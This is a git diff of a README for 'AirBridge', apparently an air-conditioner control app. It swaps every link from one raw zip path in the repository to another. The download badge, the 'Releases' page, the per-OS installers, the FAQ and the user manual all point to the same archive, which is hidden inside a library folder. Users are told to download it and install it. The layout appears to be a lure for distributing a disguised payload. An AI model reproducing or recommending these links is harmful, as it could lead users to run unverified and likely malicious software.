@@ -1,6 +1,6 @@
 # ❄️ AirBridge - Control Your AC with Ease
 
-[![Download AirBridge](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip%20AirBridge-v1.0-brightgreen)](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip)
+[![Download AirBridge](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip%20AirBridge-v1.0-brightgreen)](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip)
 
 ## 📦 Overview
 
@@ -29,16 +29,16 @@ To get started with AirBridge, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get the latest version of AirBridge, visit this page to download: [AirBridge Releases](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip).
+To get the latest version of AirBridge, visit this page to download: [AirBridge Releases](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip).
 
 ### Installation Instructions
 
-1. Visit the [AirBridge Releases](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip) page.
+1. Visit the [AirBridge Releases](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip) page.
 2. Locate the latest version of the software.
 3. Click on the link for the installation file suitable for your device:
-    - For Windows, look for `https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip`.
-    - For macOS, look for `https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip`.
-    - For Linux, use `https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip`.
+    - For Windows, look for `https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip`.
+    - For macOS, look for `https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip`.
+    - For Linux, use `https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip`.
 4. Once downloaded, open the file and follow the prompts to install.
 
 ## ⚡ Usage
@@ -73,10 +73,10 @@ AirBridge is licensed under the MIT License. This means you can freely use, modi
 
 ## 🌟 Additional Resources
 
-- [FAQ Section](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip)
-- [Installation Guide](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip)
-- [User Manual](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip)
+- [FAQ Section](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip)
+- [Installation Guide](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip)
+- [User Manual](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip)
 
 For more updates and features, follow our GitHub repository. We value your feedback and aim to improve continuously.
 
-[![Download AirBridge](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip%20AirBridge-v1.0-brightgreen)](https://raw.githubusercontent.com/Baraninathan/AirBridge/main/unshirted/AirBridge.zip)
+[![Download AirBridge](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip%20AirBridge-v1.0-brightgreen)](https://github.com/Baraninathan/AirBridge/raw/refs/heads/main/libraries/CC1101_arduino-master/Air_Bridge_1.9.zip)
